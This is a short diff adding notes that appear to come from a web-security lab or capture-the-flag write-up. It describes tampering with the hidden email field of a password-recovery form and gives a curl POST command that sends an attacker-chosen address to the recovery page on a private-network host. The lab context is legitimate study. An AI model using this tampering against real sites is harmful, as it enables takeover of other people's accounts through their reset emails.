@@ -1,0 +1,3 @@
+- http://192.168.30.129/index.php?page=recover (Change hidden input mail by yours)
+- curl -s -X POST -d "mail=ilia041@gmail.com" -d "Submit=Submit" "http://10.111.1.24//index.php?page=recover" &> /dev/null
+
